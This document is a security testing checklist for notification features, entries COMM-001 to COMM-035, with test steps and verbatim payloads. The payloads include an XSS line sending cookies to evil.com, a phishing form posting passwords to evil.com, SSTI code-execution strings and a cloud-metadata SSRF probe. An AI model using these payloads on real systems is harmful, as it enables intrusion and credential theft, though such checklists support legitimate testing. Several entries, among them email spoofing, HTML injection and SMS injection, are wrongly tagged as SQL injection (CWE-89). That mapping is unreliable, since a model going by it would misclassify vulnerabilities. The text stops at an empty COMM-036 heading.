# 10. Communication & Notification — Checklist

Feature-area security **test cases** for “10. Communication & Notification”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*196 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## COMM-001 — Email Header Injection via Notification Fields
**Test Category:** Injection (WSTG-INPV-11) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Trigger an email notification where user-controlled input is included in headers. 2. Inject CRLF characters followed by additional email headers like Cc or Bcc. 3. Submit and check if injected headers are processed. 4. Monitor if emails are sent to injected recipients.

**Expected Result:** Application must sanitize all user input used in email headers and strip CRLF characters to prevent header injection.

**Payload Example:**

```
email=user@test.com%0d%0aCc:attacker@evil.com%0d%0aBcc:spy@evil.com;name=Test%0d%0aContent-Type:text/html
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite;Custom Scripts;SMTP Tester

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## COMM-002 — Stored XSS in Email Notification Body
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Enter XSS payload in fields that appear in email notifications such as username or order notes or feedback. 2. Trigger the email notification. 3. Open the email in a web-based email client. 4. Check if the script executes in the email context.

**Expected Result:** Application must sanitize and encode all dynamic content inserted into email bodies before sending to prevent XSS in webmail clients.

**Payload Example:**

```
username=<script>fetch('https://evil.com/?c='+document.cookie)</script>;order_notes=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter;Email Client

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-003 — Email Spoofing via From Header Manipulation
**Test Category:** Injection (WSTG-INPV-11) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Intercept an email notification trigger request. 2. Check if the From or Reply-To header can be influenced by user input. 3. Modify the sender address. 4. Verify if the email is sent with the spoofed sender.

**Expected Result:** Application must hardcode the From address server-side and never accept client-provided sender information. SPF/DKIM/DMARC records must be configured.

**Payload Example:**

```
Inject from_email=admin@target.com or reply_to=attacker@evil.com in notification trigger request
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;SMTP Tester;MXToolbox

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-004 — Email Bombing via Notification Trigger Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Identify notification triggers like password reset or order confirmation. 2. Script automated requests to trigger hundreds of email notifications to a single address. 3. Check for rate limiting. 4. Verify if the target inbox is flooded.

**Expected Result:** Application must implement rate limiting on all email notification triggers to prevent email bombing attacks against users.

**Payload Example:**

```
Send 500+ POST /api/notifications/send-email requests targeting same email address in rapid succession
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite Intruder;Custom Scripts;JMeter

**References:** CWE-840; PortSwigger Business logic

---

## COMM-005 — Sensitive Data Exposure in Email Content
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Trigger various email notifications. 2. Inspect email content for sensitive data like passwords or full credit card numbers or internal IDs. 3. Check if emails are sent over TLS. 4. Verify email content encryption.

**Expected Result:** Emails must not contain plain-text passwords or full payment details and must be transmitted over TLS with appropriate masking of sensitive data.

**Payload Example:**

```
Inspect notification emails for plain_text_password;full_card_number;internal_user_id;api_key;session_token
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Email Client;Wireshark;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-006 — SSTI in Email Template Rendering
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Enter template syntax in fields rendered in email templates such as name or address. 2. Trigger the email notification. 3. Check if the template engine processes the injected expression. 4. Look for computed values or server information in the email.

**Expected Result:** Application must escape all template syntax in user-provided data before inserting into email templates to prevent server-side template injection.

**Payload Example:**

```
name={{7*7}};address=${7*7};feedback=<%= system('id') %>;comment={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap;Email Client

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## COMM-007 — HTML Injection in Email Body
**Test Category:** Injection (WSTG-INPV-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Enter HTML tags in fields that appear in notification emails. 2. Include phishing links or fake forms in the HTML. 3. Trigger the email. 4. Check if HTML renders in the email client.

**Expected Result:** Application must sanitize HTML in user-provided content before including in email bodies or use plain-text emails for user-generated content.

**Payload Example:**

```
name=<h1>URGENT: Account Compromised</h1><a href='https://evil.com/phishing'>Reset Password Now</a><form action='https://evil.com/steal'><input name='password'><button>Submit</button></form>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Email Client

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-008 — Email Notification IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Trigger an email notification for own account. 2. Intercept the request and change user_id or email parameter to another user. 3. Submit and check if notification is sent to or about the other user. 4. Verify information leakage.

**Expected Result:** Application must validate that the authenticated user can only trigger notifications for their own account and must not accept client-specified recipient overrides.

**Payload Example:**

```
Change POST /api/notifications/email with user_id=1001 to user_id=1002 or email=victim@test.com
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-009 — Open Redirect via Email Links
**Test Category:** Open Redirect (WSTG-CLNT-04) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Trigger an email notification containing links. 2. Check if any link parameters allow URL manipulation. 3. Modify the redirect URL to an external malicious site. 4. Click the link and verify redirection.

**Expected Result:** Application must validate all URLs in email notifications against a whitelist and prevent redirects to external or untrusted domains.

**Payload Example:**

```
Email link: https://target.com/redirect?url=https://evil.com/phishing or https://target.com/click?next=//evil.com
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite;Browser

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## COMM-010 — Email Attachment Malware Injection
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. If email notifications include user-uploaded attachments check file type validation. 2. Upload a malicious file as an attachment. 3. Trigger the email. 4. Check if the malicious attachment is delivered.

**Expected Result:** Application must scan all email attachments for malware and validate file types before including in notification emails.

**Payload Example:**

```
Upload shell.exe renamed to report.pdf.exe or macro-enabled document.docm as attachment
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;ClamAV;VirusTotal

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## COMM-011 — Unsubscribe Link IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Receive an email notification with an unsubscribe link. 2. Modify the user identifier in the unsubscribe URL. 3. Visit the modified URL. 4. Check if another user is unsubscribed from notifications.

**Expected Result:** Application must use cryptographically signed or tokenized unsubscribe links that cannot be manipulated to affect other users.

**Payload Example:**

```
Change /unsubscribe?user_id=1001&token=abc to user_id=1002&token=abc or /unsubscribe?email=victim@test.com
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Browser

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-012 — Email Notification Timing Side-Channel
**Test Category:** Information Disclosure (WSTG-INFO-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Trigger email notifications for existing and non-existing accounts. 2. Measure response times precisely. 3. Check if timing differences reveal whether an account exists.

**Expected Result:** Application must ensure consistent response times for notification triggers regardless of whether the target account exists to prevent enumeration.

**Payload Example:**

```
Compare response time for POST /api/notify?email=existing@test.com vs email=nonexistent@test.com
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-013 — SMS Injection via Phone Number Field
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. Update notification phone number. 2. Inject additional phone numbers or SMS content using delimiters. 3. Submit and check if SMS is sent to injected numbers. 4. Test with various separator characters.

**Expected Result:** Application must validate phone numbers strictly against international format patterns and reject any input containing separators or additional data.

**Payload Example:**

```
phone=+1234567890;+0987654321;phone=+1234567890%0d%0aSend money to attacker;phone=+1234567890\nNew message content
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-014 — SMS Flooding via Notification Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. Identify SMS notification triggers like OTP or order updates. 2. Script rapid automated requests to send hundreds of SMS messages to a target number. 3. Check for rate limiting. 4. Calculate potential cost abuse.

**Expected Result:** Application must implement strict rate limiting on SMS notifications per phone number and per user with cooldown periods between requests.

**Payload Example:**

```
Send 200+ POST /api/notifications/sms requests to same phone number within 5 minutes
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COMM-015 — SMS Content Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. Intercept the SMS notification trigger request. 2. Check if SMS content or template_id can be modified. 3. Change the message content to send phishing or misleading messages. 4. Submit and verify.

**Expected Result:** Application must generate SMS content server-side from predefined templates and never accept client-provided message content.

**Payload Example:**

```
Change sms_body=Your order is confirmed to sms_body=Account suspended. Call +1-ATTACKER-NUM immediately;modify template_id
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COMM-016 — Phone Number Enumeration via SMS Notifications
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. Trigger SMS notifications with various phone numbers. 2. Check response differences for valid vs invalid registered numbers. 3. Look for confirmation messages that reveal registration status.

**Expected Result:** Application must return identical responses for SMS notifications regardless of whether the phone number is registered to prevent enumeration.

**Payload Example:**

```
POST /api/sms/send with various phone numbers and compare responses for registered vs unregistered numbers
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## COMM-017 — International SMS Premium Rate Abuse
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. Trigger SMS notification. 2. Change the recipient phone number to a premium rate number controlled by the attacker. 3. Submit repeatedly. 4. Check if the application sends SMS to premium numbers generating revenue for attacker.

**Expected Result:** Application must validate phone numbers against a blacklist of premium rate numbers and implement cost controls on SMS sending.

**Payload Example:**

```
Change phone to premium rate numbers like +44871xxxxxxx or international premium numbers
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COMM-018 — SMS OTP Bypass via Response Manipulation
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. Request SMS OTP. 2. Intercept the API response. 3. Check if OTP is leaked in the response body or headers. 4. Modify response status to bypass OTP verification.

**Expected Result:** Application must never include OTP values in API responses and must validate OTP server-side without trusting client-side verification.

**Payload Example:**

```
Check response for otp_code;verification_code;token fields;change {"verified":false} to {"verified":true}
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COMM-019 — SSRF via SMS Gateway Configuration
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. If the application allows configuring SMS gateway URLs or webhook endpoints intercept the request. 2. Set the URL to an internal service. 3. Check for SSRF.

**Expected Result:** Application must hardcode SMS gateway endpoints server-side and not allow client-side configuration of gateway URLs.

**Payload Example:**

```
gateway_url=http://169.254.169.254/latest/meta-data/;callback_url=http://localhost:6379/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COMM-020 — SMS Template Injection
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. Enter template syntax in fields included in SMS messages. 2. Trigger the SMS notification. 3. Check if the template engine processes the injected syntax in the SMS content.

**Expected Result:** Application must escape template expressions in user data before inserting into SMS templates.

**Payload Example:**

```
name={{7*7}};order_id=${Runtime.getRuntime().exec('id')};comment=#{7*7}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## COMM-021 — Push Notification Token Theft
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. Inspect client-side storage for push notification tokens. 2. Check if the device token is exposed in API responses or logs. 3. Attempt to use a stolen token to send notifications to another user's device.

**Expected Result:** Application must protect push notification tokens and not expose them in client-accessible responses or logs.

**Payload Example:**

```
Check localStorage;sessionStorage;API responses for device_token;fcm_token;apns_token values
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-022 — Push Notification Spoofing via Token Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. Register for push notifications and capture the device token. 2. Intercept the registration request and replace with another user's device token. 3. Check if notifications meant for the attacker are sent to the victim's device.

**Expected Result:** Application must bind push tokens to authenticated user sessions and validate ownership before sending any notifications.

**Payload Example:**

```
Replace device_token in POST /api/push/register with another user's captured device_token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-023 — XSS in Push Notification Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. If push notification content is derived from user input inject XSS payload in the relevant fields. 2. Trigger the push notification. 3. Check if payload executes when the notification is rendered in the browser or app.

**Expected Result:** Application must sanitize all dynamic content in push notifications before rendering in any client context.

**Payload Example:**

```
Set order_name=<img src=x onerror=alert(document.cookie)> and trigger push notification containing this field
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-024 — Unauthorized Push Notification Sending
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. As a regular user attempt to access the push notification sending endpoint. 2. Try to send notifications to other users or broadcast to all users. 3. Check if role-based access control is enforced.

**Expected Result:** Application must restrict push notification sending capabilities to authorized administrator roles only.

**Payload Example:**

```
POST /api/push/send with target=all_users and message=Phishing content using regular user credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-025 — Push Notification Denial of Service
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. Trigger rapid push notification sends to a single device. 2. Send hundreds of notifications in quick succession. 3. Check for rate limiting. 4. Monitor device impact.

**Expected Result:** Application must implement rate limiting on push notifications per device and per user to prevent notification flooding.

**Payload Example:**

```
Send 1000+ POST /api/push/send requests targeting same device_token in rapid succession
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## COMM-026 — Push Notification Content Injection via Deep Links
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. If push notifications contain deep links or action URLs check if the URL can be manipulated. 2. Inject malicious deep link URLs. 3. Check if users are redirected to malicious content when tapping the notification.

**Expected Result:** Application must validate all deep link URLs in push notifications against a whitelist of allowed schemes and domains.

**Payload Example:**

```
action_url=javascript:alert(1);deep_link=https://evil.com/phishing;action=intent://evil.com#Intent;end
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-027 — Sensitive Data in Push Notification Payload
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. Trigger various push notifications. 2. Intercept the notification payloads. 3. Check for sensitive data like full order details or personal information visible on lock screen.

**Expected Result:** Push notifications must not contain sensitive data and must be configured to hide content on lock screens until device is unlocked.

**Payload Example:**

```
Check notification payload for full_address;payment_details;account_balance;personal_messages visible on lock screen
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Mobile Proxy;Frida

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-028 — Push Token Registration Without Authentication
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. Attempt to register a push notification token without authentication. 2. Remove authorization headers. 3. Check if unauthenticated token registration is allowed.

**Expected Result:** Application must require valid authentication before allowing push notification token registration.

**Payload Example:**

```
POST /api/push/register with device_token=TOKEN123 without Authorization header
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COMM-029 — IDOR on In-App Notification Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** In-App Notifications

**Test Steps:** 1. Fetch in-app notifications for own account. 2. Intercept the request and change user_id to another user. 3. Check if another user's notifications are returned. 4. Look for sensitive information in notifications.

**Expected Result:** Application must validate that the authenticated user can only access their own in-app notifications.

**Payload Example:**

```
Change GET /api/notifications?user_id=1001 to user_id=1002;change GET /api/notifications/NOTIF-1001 to NOTIF-1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-030 — Stored XSS via In-App Notification Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** In-App Notifications

**Test Steps:** 1. Trigger actions that generate in-app notifications with user-controlled content. 2. Inject XSS payload in the content fields. 3. View the notification center. 4. Check if the script executes.

**Expected Result:** Application must sanitize and encode all notification content before rendering in the notification center UI.

**Payload Example:**

```
Create order with name=<script>alert(document.cookie)</script> and check if notification displays with XSS execution
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-031 — Notification Injection by Unauthorized User
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** In-App Notifications

**Test Steps:** 1. Attempt to create or inject in-app notifications for other users via API. 2. Send crafted requests to the notification creation endpoint. 3. Check if notifications appear in other users' notification centers.

**Expected Result:** Application must restrict notification creation to authorized system processes and admin roles and prevent user-to-user notification injection.

**Payload Example:**

```
POST /api/notifications/create with target_user_id=1002 and message=Phishing content using regular user credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-032 — In-App Notification Data Leakage
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** In-App Notifications

**Test Steps:** 1. Fetch notifications via API. 2. Inspect the full response for excessive data. 3. Check for internal system information or other users' data in notification payloads.

**Expected Result:** Application must return only necessary notification fields and strip any internal metadata or cross-user data from responses.

**Payload Example:**

```
Check notification response for internal_id;admin_notes;other_user_data;system_config;debug_info
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-033 — Notification Count Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** In-App Notifications

**Test Steps:** 1. Check the unread notification count endpoint. 2. Intercept and modify the count value. 3. Check if the manipulated count affects application behavior or creates confusion.

**Expected Result:** Application must calculate notification counts server-side and not trust client-provided count values.

**Payload Example:**

```
Intercept response and change {"unread_count":2} to {"unread_count":9999} and check UI impact
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## COMM-034 — Mass Notification Deletion Without Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** In-App Notifications

**Test Steps:** 1. Attempt to delete all notifications via a bulk delete endpoint. 2. Include notification IDs belonging to other users. 3. Check if cross-user deletion is possible.

**Expected Result:** Application must validate ownership of every notification before allowing deletion.

**Payload Example:**

```
POST /api/notifications/bulk-delete with notification_ids containing other users' notification IDs
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-035 — Clickjacking on Notification Actions
**Test Category:** Clickjacking (WSTG-CLNT-09) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** In-App Notifications

**Test Steps:** 1. Create a page that iframes the notification center. 2. Overlay invisible buttons over notification action buttons like accept or approve. 3. Lure victim to click. 4. Check if framing is allowed.

**Expected Result:** Application must implement X-Frame-Options DENY and CSP frame-ancestors none on notification pages with action buttons.

**Payload Example:**

```
<iframe src='https://target.com/notifications' style='opacity:0'></iframe> with overlay buttons on Accept/Approve actions
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite;Browser

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## COMM-036 — WebSocket Authentication Bypass
